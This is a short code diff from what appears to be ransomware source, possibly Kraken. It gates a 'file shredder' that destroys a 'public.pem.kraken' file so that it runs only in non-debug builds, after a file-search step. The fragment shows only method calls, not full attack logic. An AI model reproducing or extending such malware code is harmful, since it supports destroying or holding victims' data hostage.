@@ -43,10 +43,12 @@ int _tmain()
         search_engine_class_obj->method->se_destroy(search_engine_class_obj);
     }
 
+#ifndef _DEBUG
     file_shredder_class_t* file_shredder_class_obj = file_shredder_class_create(_T("public.pem.kraken"));
     if (file_shredder_class_obj)
     {
         file_shredder_class_obj->method->fs_start(file_shredder_class_obj);
         file_shredder_class_obj->method->fs_destroy(file_shredder_class_obj);
     }
+#endif
 }
